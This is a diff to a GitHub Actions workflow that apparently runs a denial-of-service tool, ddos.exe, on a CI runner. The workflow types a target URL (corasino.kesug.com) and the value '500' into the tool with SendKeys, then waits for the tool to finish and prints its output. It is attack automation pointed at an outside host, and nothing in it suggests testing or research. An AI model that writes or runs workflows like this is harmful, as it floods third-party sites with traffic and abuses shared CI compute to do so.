@@ -33,20 +33,23 @@ jobs:
     - name: Run ddos.exe
       run: |
         cd ddos\dist
-        Start-Process -FilePath .\ddos.exe -PassThru
+        $process = Start-Process -FilePath .\ddos.exe -PassThru -RedirectStandardOutput output.txt
 
         # Wait for ddos.exe to start
         Start-Sleep -Seconds 5
 
-        # Send "" and Enter to ddos.exe
+        # Send "http://corasino.kesug.com" and Enter to ddos.exe
         Add-Type -AssemblyName System.Windows.Forms
         [System.Windows.Forms.SendKeys]::SendWait("http://corasino.kesug.com{ENTER}")
 
         # Wait for some time
         Start-Sleep -Seconds 10
 
-        # Send "" and Enter to ddos.exe
+        # Send "500" and Enter to ddos.exe
         [System.Windows.Forms.SendKeys]::SendWait("500{ENTER}")
 
         # Wait for ddos.exe to finish
-        Start-Sleep -Seconds 120  # Adjust the time based on your requirements
+        $process.WaitForExit()
+
+        # Print the output
+        Get-Content output.txt
